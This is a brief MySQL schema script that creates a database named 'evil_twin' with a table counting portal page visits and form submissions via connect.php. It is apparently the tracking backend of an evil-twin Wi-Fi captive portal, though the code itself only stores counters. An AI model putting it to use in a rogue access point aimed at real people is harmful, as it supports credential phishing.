CREATE DATABASE IF NOT EXISTS evil_twin
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;

USE evil_twin;

-- Key/value table: one row per counter
CREATE TABLE IF NOT EXISTS counters (
  name       VARCHAR(50)  NOT NULL PRIMARY KEY,
  value      INT UNSIGNED NOT NULL DEFAULT 0,
  updated_at TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP
                          ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB;

-- Initialize the two counters
INSERT IGNORE INTO counters (name, value) VALUES
  ('attempt', 0),      -- portal access attempts (index page opened)
  ('connection', 0);   -- connections (form submitted via connect.php)